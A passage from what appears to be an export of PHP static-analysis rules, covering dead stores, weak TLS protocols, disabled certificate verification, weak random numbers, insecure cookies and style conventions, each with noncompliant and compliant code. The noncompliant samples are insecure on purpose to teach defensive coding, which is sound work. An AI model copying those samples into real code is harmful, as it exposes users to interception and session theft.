$i = compute();
</pre>
<h2>Compliant Solution</h2>
<pre>
$i = $a + $b;
$i += compute();
</pre>
<h2>Exceptions</h2>
<p>This rule ignores initializations to -1, 0, 1, <code>null</code>, <code>true</code>, <code>false</code>, <code>""""</code>, <code>[]</code> and
<code>array()</code>.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/563.html"">MITRE, CWE-563</a> - Assignment to Variable without Use ('Unused Variable') </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/QYA5"">CERT, MSC13-C.</a> - Detect and remove unused values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/uQCSBg"">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
</ul>",php:S1854,php,PHP,"<p>A dead store happens when a local variable is assigned a value that is not read by any subsequent instruction. Calculating or retrieving a value
only to then overwrite it or throw it away, could indicate a serious error in the code. Even if it's not an error, it is at best a waste of resources.
Therefore all calculated values should be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$i = $a + $b; // Noncompliant; calculation result not used before value is overwritten
$i = compute();
</pre>
<h2>Compliant Solution</h2>
<pre>
$i = $a + $b;
$i += compute();
</pre>
<h2>Exceptions</h2>
<p>This rule ignores initializations to -1, 0, 1, <code>null</code>, <code>true</code>, <code>false</code>, <code>""""</code>, <code>[]</code> and
<code>array()</code>.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/563.html"">MITRE, CWE-563</a> - Assignment to Variable without Use ('Unused Variable') </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/QYA5"">CERT, MSC13-C.</a> - Detect and remove unused values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/uQCSBg"">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
</ul>",Dead stores should be removed,[],MAJOR,"['cert', 'cwe', 'unused']",CODE_SMELL
2018-07-31T12:24:47+0200,"<p>Not all SSL protocols are created equal and some legacy ones like ""SSL"", have been proven to be insecure.</p>
<p>This rule raises an issue when an SSL context is created with an insecure protocol (ie: a protocol different from ""TLSv1.2"" or ""DTLSv1.2"").</p>
<h2>Noncompliant Code Example</h2>
<pre>
$ctx = stream_context_create([
  'ssl' =&gt; [
    'crypto_method' =&gt;
      STREAM_CRYPTO_METHOD_TLSv1_1_CLIENT // Noncompliant
  ],
]);
</pre>
<h2>Compliant Solution</h2>
<pre>
$ctx = stream_context_create([
    'ssl' =&gt; [
        'crypto_method' =&gt; STREAM_CRYPTO_METHOD_TLSv1_2_CLIENT
    ],
]);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/326.html"">MITRE, CWE-327</a> - Inadequate Encryption Strength </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/327.html"">MITRE, CWE-326</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href=""https://blogs.oracle.com/java-platform-group/diagnosing-tls,-ssl,-and-https"">Diagnosing TLS, SSL, and HTTPS</a> </li>
</ul>",php:S4423,php,PHP,"<p>Not all SSL protocols are created equal and some legacy ones like ""SSL"", have been proven to be insecure.</p>
<p>This rule raises an issue when an SSL context is created with an insecure protocol (ie: a protocol different from ""TLSv1.2"" or ""DTLSv1.2"").</p>
<h2>Noncompliant Code Example</h2>
<pre>
$ctx = stream_context_create([
  'ssl' =&gt; [
    'crypto_method' =&gt;
      STREAM_CRYPTO_METHOD_TLSv1_1_CLIENT // Noncompliant
  ],
]);
</pre>
<h2>Compliant Solution</h2>
<pre>
$ctx = stream_context_create([
    'ssl' =&gt; [
        'crypto_method' =&gt; STREAM_CRYPTO_METHOD_TLSv1_2_CLIENT
    ],
]);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/326.html"">MITRE, CWE-327</a> - Inadequate Encryption Strength </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/327.html"">MITRE, CWE-326</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href=""https://blogs.oracle.com/java-platform-group/diagnosing-tls,-ssl,-and-https"">Diagnosing TLS, SSL, and HTTPS</a> </li>
</ul>",Weak SSL protocols should not be used,[],MAJOR,"['cwe', 'owasp-a3', 'owasp-a6', 'sans-top25-porous']",VULNERABILITY
2018-07-31T12:24:47+0200,"<p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386"">CVE-2013-6386</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419"">CVE-2006-3419</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102"">CVE-2008-4102</a> </li>
</ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the <code>rand()</code> and <code>mt_rand</code> functions rely on a pseudorandom number generator, it should not be used for security-critical
applications or for protecting sensitive data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li>
  <li> the function you use generates a value which can be predicted (pseudo-random). </li>
  <li> the generated value is used multiple times. </li>
  <li> an attacker can access the generated value. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use functions which rely on a cryptographically strong random number generator such as <code>random_int()</code> or <code>random_bytes()</code>
  or <code>openssl_random_pseudo_bytes()</code> </li>
  <li> When using <code>openssl_random_pseudo_bytes()</code>, provide and check the <code>crypto_strong</code> parameter </li>
  <li> Use the generated random values only once. </li>
  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
$random = rand();
$random2 = mt_rand(0, 99);
</pre>
<h2>Compliant Solution</h2>
<pre>
$randomInt = random_int(0,99); // Compliant; generates a cryptographically secure random integer
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/338.html"">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator
  (PRNG) </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/330.html"">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/326.html"">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/310"">MITRE, CWE-310</a> - Cryptographic Issues </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/mAFqAQ"">CERT, MSC02-J.</a> - Generate strong random numbers </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qw4"">CERT, MSC30-C.</a> - Do not use the rand() function for generating pseudorandom
  numbers </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/WYIyAQ"">CERT, MSC50-CPP.</a> - Do not use std::rand() for generating pseudorandom
  numbers </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> Derived from FindSecBugs rule <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM"">Predictable Pseudo Random Number
  Generator</a> </li>
</ul>",php:S2245,php,PHP,"<p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386"">CVE-2013-6386</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419"">CVE-2006-3419</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102"">CVE-2008-4102</a> </li>
</ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the <code>rand()</code> and <code>mt_rand</code> functions rely on a pseudorandom number generator, it should not be used for security-critical
applications or for protecting sensitive data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li>
  <li> the function you use generates a value which can be predicted (pseudo-random). </li>
  <li> the generated value is used multiple times. </li>
  <li> an attacker can access the generated value. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use functions which rely on a cryptographically strong random number generator such as <code>random_int()</code> or <code>random_bytes()</code>
  or <code>openssl_random_pseudo_bytes()</code> </li>
  <li> When using <code>openssl_random_pseudo_bytes()</code>, provide and check the <code>crypto_strong</code> parameter </li>
  <li> Use the generated random values only once. </li>
  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
$random = rand();
$random2 = mt_rand(0, 99);
</pre>
<h2>Compliant Solution</h2>
<pre>
$randomInt = random_int(0,99); // Compliant; generates a cryptographically secure random integer
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/338.html"">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator
  (PRNG) </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/330.html"">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/326.html"">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/310"">MITRE, CWE-310</a> - Cryptographic Issues </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/mAFqAQ"">CERT, MSC02-J.</a> - Generate strong random numbers </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qw4"">CERT, MSC30-C.</a> - Do not use the rand() function for generating pseudorandom
  numbers </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/WYIyAQ"">CERT, MSC50-CPP.</a> - Do not use std::rand() for generating pseudorandom
  numbers </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> Derived from FindSecBugs rule <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM"">Predictable Pseudo Random Number
  Generator</a> </li>
</ul>",Using pseudorandom number generators (PRNGs) is security-sensitive,[],CRITICAL,"['cert', 'cwe', 'owasp-a3']",SECURITY_HOTSPOT
2018-11-06T12:16:59+0100,"<p>Disabling SSL/TLS certificates chain of trust verification is similar to trust every one in the chain and so to expose the application to
man-in-the-middle (MITM) attacks.</p>
<h2>Noncompliant Code Example</h2>
<pre>
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, FALSE);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, TRUE); // Noncompliant; TRUE is casted to 1 which is not a secure configuration
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);

// and/or

curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
</pre>
<h2>Compliant Solution</h2>
<pre>
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2); // Compliant; default value is 2 to ""check the existence of a common name and also verify that it matches the hostname provided"" according to PHP's documentation

// and/or

curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, TRUE); // Compliant; default value is TRUE
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 1);
</pre>",php:S4830,php,PHP,"<p>Disabling SSL/TLS certificates chain of trust verification is similar to trust every one in the chain and so to expose the application to
man-in-the-middle (MITM) attacks.</p>
<h2>Noncompliant Code Example</h2>
<pre>
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, FALSE);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, TRUE); // Noncompliant; TRUE is casted to 1 which is not a secure configuration
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);

// and/or

curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
</pre>
<h2>Compliant Solution</h2>
<pre>
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2); // Compliant; default value is 2 to ""check the existence of a common name and also verify that it matches the hostname provided"" according to PHP's documentation

// and/or

curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, TRUE); // Compliant; default value is TRUE
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 1);
</pre>",SSL/TLS certificates chain of trust verification should not be disabled,[],CRITICAL,['ssl'],VULNERABILITY
2018-11-06T12:16:59+0100,"<p>PHP 5.3 introduces <a href=""http://www.php.net/namespaces"">namespaces</a> to the language. Use of this mechanism should be preferred to
<code>include</code> or <code>include_once</code> or <code>require</code> or <code>require_once</code> because it solves two common problems:</p>
<ul>
  <li> it avoids name collisions </li>
  <li> it provides the ability to create alias which improve readability of the code </li>
</ul>
<p>Starting from its version 8, Drupal is relying on namespaces to be compliant with <a
href=""https://github.com/php-fig/fig-standards/blob/master/accepted/PSR-4-autoloader.md"">PSR-4 standard</a>. Drupal's modules should be compliant with
PSR-4 standard and therefore should no longer rely on <code>include</code> or <code>include_once</code> or <code>require</code> or
<code>require_once</code> functions.</p>
<h2>Noncompliant Code Example</h2>
<pre>
require_once('./modules/vegetable/src/Entity/Tomato.php');
</pre>
<h2>Compliant Solution</h2>
<pre>
use Drupal\vegetable\Entity\Tomato
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise issues on <code>autoload.php</code> or <code>ScriptHandler.php</code> files.</p>",php:S4833,php,PHP,"<p>PHP 5.3 introduces <a href=""http://www.php.net/namespaces"">namespaces</a> to the language. Use of this mechanism should be preferred to
<code>include</code> or <code>include_once</code> or <code>require</code> or <code>require_once</code> because it solves two common problems:</p>
<ul>
  <li> it avoids name collisions </li>
  <li> it provides the ability to create alias which improve readability of the code </li>
</ul>
<p>Starting from its version 8, Drupal is relying on namespaces to be compliant with <a
href=""https://github.com/php-fig/fig-standards/blob/master/accepted/PSR-4-autoloader.md"">PSR-4 standard</a>. Drupal's modules should be compliant with
PSR-4 standard and therefore should no longer rely on <code>include</code> or <code>include_once</code> or <code>require</code> or
<code>require_once</code> functions.</p>
<h2>Noncompliant Code Example</h2>
<pre>
require_once('./modules/vegetable/src/Entity/Tomato.php');
</pre>
<h2>Compliant Solution</h2>
<pre>
use Drupal\vegetable\Entity\Tomato
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise issues on <code>autoload.php</code> or <code>ScriptHandler.php</code> files.</p>","Use of namespaces should be preferred to ""include"" or ""require"" functions",[],MAJOR,['drupal'],CODE_SMELL
2018-11-06T12:16:59+0100,"<p>Jump statements, such as <code>return</code>, <code>goto</code>, and <code>continue</code> let you change the default flow of program execution,
but jump statements that direct the control flow to the original direction are just a waste of keystrokes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo($p) {
  $i = $p;
  while ($i &gt; 0) {
    $i--;
    continue; // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo($p) {
  $i = $p;
  while ($i &gt; 0) {
    $i--;
  }
}
</pre>",php:S3626,php,PHP,"<p>Jump statements, such as <code>return</code>, <code>goto</code>, and <code>continue</code> let you change the default flow of program execution,
but jump statements that direct the control flow to the original direction are just a waste of keystrokes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo($p) {
  $i = $p;
  while ($i &gt; 0) {
    $i--;
    continue; // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo($p) {
  $i = $p;
  while ($i &gt; 0) {
    $i--;
  }
}
</pre>",Jump statements should not be redundant,[],MINOR,"['clumsy', 'redundant']",CODE_SMELL
2018-07-31T12:24:47+0200,"<p>The ""secure"" attribute prevents cookies from being sent over plaintext connections such as HTTP, where they would be easily eavesdropped upon.
Instead, cookies with the secure attribute are only sent over encrypted HTTPS connections.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> set the last parameter of the <code>setcookie</code> function to ""true"" </li>
  <li> set <code>session.cookie_secure = 1</code> in the php.ini file </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
; php.ini
session.cookie_secure = 0; Noncompliant

// in PHP code
session_set_cookie_params($lifetime, $path, $domain, false); // Noncompliant, the last parameter means that the session cookie should not be secure

setcookie($name, $value, $expire, $path, $domain, false); // Noncompliant, the last parameter means that the cookie should not be secure
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/311"">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/315"">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/614"">MITRE, CWE-614</a> - Sensitive Cookie in HTTPS Session Without 'Secure' Attribute </li>
  <li> OWASP Top 10 2017 Category A2 - Broken Authentication </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",php:S2092,php,PHP,"<p>The ""secure"" attribute prevents cookies from being sent over plaintext connections such as HTTP, where they would be easily eavesdropped upon.
Instead, cookies with the secure attribute are only sent over encrypted HTTPS connections.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> set the last parameter of the <code>setcookie</code> function to ""true"" </li>
  <li> set <code>session.cookie_secure = 1</code> in the php.ini file </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
; php.ini
session.cookie_secure = 0; Noncompliant

// in PHP code
session_set_cookie_params($lifetime, $path, $domain, false); // Noncompliant, the last parameter means that the session cookie should not be secure

setcookie($name, $value, $expire, $path, $domain, false); // Noncompliant, the last parameter means that the cookie should not be secure
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/311"">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/315"">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/614"">MITRE, CWE-614</a> - Sensitive Cookie in HTTPS Session Without 'Secure' Attribute </li>
  <li> OWASP Top 10 2017 Category A2 - Broken Authentication </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>","Creating cookies without the ""secure"" flag is security-sensitive",[],MINOR,"['cwe', 'owasp-a2', 'owasp-a3', 'sans-top25-porous']",SECURITY_HOTSPOT
2013-07-11T13:27:28+0200,An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.,common-php:InsufficientBranchCoverage,php,PHP,An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.,Branches should have sufficient coverage by tests,"[{'key': 'minimumBranchCoverageRatio', 'defaultValue': '65', 'type': 'FLOAT'}]",MAJOR,['bad-practice'],CODE_SMELL
2013-07-11T13:27:28+0200,An issue is created on a file as soon as there is at least one block of duplicated code on this file,common-php:DuplicatedBlocks,php,PHP,An issue is created on a file as soon as there is at least one block of duplicated code on this file,Source files should not have any duplicated blocks,[],MAJOR,['pitfall'],CODE_SMELL
2013-07-11T13:27:28+0200,Test failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.,common-php:FailedUnitTests,php,PHP,Test failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.,Failed unit tests should be fixed,[],MAJOR,[],BUG
2013-07-11T13:27:28+0200,An issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.,common-php:InsufficientCommentDensity,php,PHP,An issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.,Source files should have a sufficient density of comment lines,"[{'key': 'minimumCommentDensity', 'defaultValue': '25', 'type': 'FLOAT'}]",MAJOR,['convention'],CODE_SMELL
2013-07-11T13:27:28+0200,An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.,common-php:InsufficientLineCoverage,php,PHP,An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.,Lines should have sufficient coverage by tests,"[{'key': 'minimumLineCoverageRatio', 'defaultValue': '65', 'type': 'FLOAT'}]",MAJOR,['bad-practice'],CODE_SMELL
2013-07-11T13:27:28+0200,Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.,common-php:SkippedUnitTests,php,PHP,Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.,Skipped unit tests should be either removed or fixed,[],MAJOR,['pitfall'],CODE_SMELL
2017-11-30T14:19:40+0100,"<p>Any issue to quality rule can be deactivated with the <code>NOSONAR</code> marker. This marker is pretty useful to exclude false-positive results
but it can also be used abusively to hide real quality flaws.</p>
<p>This rule raises an issue when <code>NOSONAR</code> is used.</p>",php:NoSonar,php,PHP,"<p>Any issue to quality rule can be deactivated with the <code>NOSONAR</code> marker. This marker is pretty useful to exclude false-positive results
but it can also be used abusively to hide real quality flaws.</p>
<p>This rule raises an issue when <code>NOSONAR</code> is used.</p>","Track uses of ""NOSONAR"" comments",[],MAJOR,['bad-practice'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all function names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression: <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
function DoSomething(){...}
</pre>
<h2>Compliant Solution</h2>
<pre>
function doSomething(){...}
</pre>
<h2>Exceptions</h2>
<p>Methods with an <code>@inheritdoc</code> annotation, as well as magic methods (<code>__construct()</code>, <code>__destruct()</code>,
<code>__call()</code>, <code>__callStatic()</code>, <code>__get()</code>, <code>__set()</code>, <code>__isset()</code>, <code>__unset()</code>,
<code>__sleep()</code>, <code>__wakeup()</code>, <code>__toString()</code>, <code>__invoke()</code>, <code>__set_state()</code>,
<code>__clone()</code>, <code>__debugInfo()</code>) are ignored.</p>
<pre>
function __construct(){...}
function __destruct(){...}

/**
 * {@inheritdoc}
 */
function myFunc(){...}
</pre>",php:S100,php,PHP,"<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all function names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression: <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
function DoSomething(){...}
</pre>
<h2>Compliant Solution</h2>
<pre>
function doSomething(){...}
</pre>
<h2>Exceptions</h2>
<p>Methods with an <code>@inheritdoc</code> annotation, as well as magic methods (<code>__construct()</code>, <code>__destruct()</code>,
<code>__call()</code>, <code>__callStatic()</code>, <code>__get()</code>, <code>__set()</code>, <code>__isset()</code>, <code>__unset()</code>,
<code>__sleep()</code>, <code>__wakeup()</code>, <code>__toString()</code>, <code>__invoke()</code>, <code>__set_state()</code>,
<code>__clone()</code>, <code>__debugInfo()</code>) are ignored.</p>
<pre>
function __construct(){...}
function __destruct(){...}

/**
 * {@inheritdoc}
 */
function myFunc(){...}
</pre>",Method and function names should comply with a naming convention,"[{'key': 'format', 'defaultValue': '^[a-z][a-zA-Z0-9]*$', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p>Shared coding conventions allow teams to collaborate effectively. This rule allows to check that all class names match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>:</p>
<pre>
class my_class {...}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {...}
</pre>",php:S101,php,PHP,"<p>Shared coding conventions allow teams to collaborate effectively. This rule allows to check that all class names match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>:</p>
<pre>
class my_class {...}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {...}
</pre>",Class names should comply with a naming convention,"[{'key': 'format', 'defaultValue': '^[A-Z][a-zA-Z0-9]*$', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2014-06-12T08:21:17+0200,<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>,php:S103,php,PHP,<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>,Lines should not be too long,"[{'key': 'maximumLineLength', 'defaultValue': '120', 'type': 'INTEGER'}]",MAJOR,['convention'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>",php:S104,php,PHP,"<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>",Files should not have too many lines of code,"[{'key': 'max', 'htmlDesc': 'Maximum authorized lines of code in a file.', 'defaultValue': '1000', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p>Developers should not need to configure the tab width of their text editors in order to be able to read source code.</p>
<p>So the use of the tabulation character must be banned.</p>",php:S105,php,PHP,"<p>Developers should not need to configure the tab width of their text editors in order to be able to read source code.</p>
<p>So the use of the tabulation character must be banned.</p>",Tabulation characters should not be used,[],MINOR,"['convention', 'psr2']",CODE_SMELL
2014-06-12T08:21:17+0200,"<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition1) {
  if (condition2) {
    ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition1 &amp;&amp; condition2) {
  ...
}
</pre>",php:S1066,php,PHP,"<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition1) {
  if (condition2) {
    ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition1 &amp;&amp; condition2) {
  ...
}
</pre>","Collapsible ""if"" statements should be merged",[],MAJOR,['clumsy'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p>The complexity of an expression is defined by the number of <code>&amp;&amp;</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code>
operators it contains.</p>
<p>A single expression's complexity should not become too high to keep the code readable.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold value of 3</p>
<pre>
if ((($condition1 &amp;&amp; $condition2) || ($condition3 &amp;&amp; $condition4)) &amp;&amp; $condition5) { ... }
</pre>
<h2>Compliant Solution</h2>
<pre>
if ( (my_first_condition() || my_second_condition()) &amp;&amp; my_last_condition()) { ... }
</pre>",php:S1067,php,PHP,"<p>The complexity of an expression is defined by the number of <code>&amp;&amp;</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code>
operators it contains.</p>
<p>A single expression's complexity should not become too high to keep the code readable.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold value of 3</p>
<pre>
if ((($condition1 &amp;&amp; $condition2) || ($condition3 &amp;&amp; $condition4)) &amp;&amp; $condition5) { ... }
</pre>
<h2>Compliant Solution</h2>
<pre>
if ( (my_first_condition() || my_second_condition()) &amp;&amp; my_last_condition()) { ... }
</pre>",Expressions should not be too complex,"[{'key': 'max', 'defaultValue': '3', 'type': 'INTEGER'}]",CRITICAL,['brain-overload'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p>If a <code>private</code> field is declared but not used in the program, it can be considered dead code and should therefore be removed. This will
improve maintainability because developers will not wonder what the variable is used for.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass {
  private $foo = 4;                       //foo is unused

  public function compute($a) {
    return $a * 4;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {

  public function compute($a) {
    return $a * 4;
  }
}
</pre>",php:S1068,php,PHP,"<p>If a <code>private</code> field is declared but not used in the program, it can be considered dead code and should therefore be removed. This will
improve maintainability because developers will not wonder what the variable is used for.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass {
  private $foo = 4;                       //foo is unused

  public function compute($a) {
    return $a * 4;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {

  public function compute($a) {
    return $a * 4;
  }
}
</pre>","Unused ""private"" fields should be removed",[],MAJOR,['unused'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>
<h2>Noncompliant Code Example</h2>
